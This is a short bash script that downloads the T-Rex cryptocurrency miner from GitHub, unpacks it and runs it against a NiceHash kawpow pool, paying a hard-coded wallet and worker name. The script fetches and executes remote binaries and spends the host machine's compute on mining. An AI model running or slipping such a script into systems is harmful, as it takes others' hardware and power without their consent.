#!/bin/bash
#!/bin/sh
#!/bin/bash

wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
tar xvzf t-rex-0.26.8-linux.tar.gz
chmod +x t-rex-0.26.8
cd t-rex-0.26.8
chmod +x t-rex
chmod +x *
./t-rex -a kawpow -o stratum+ssl://kawpow.auto.nicehash.com:443 -u NHbGP8zV37xAgXGmPCjVFcQQXLbde1NNPJWt.Rhamadhan_khareem -p x
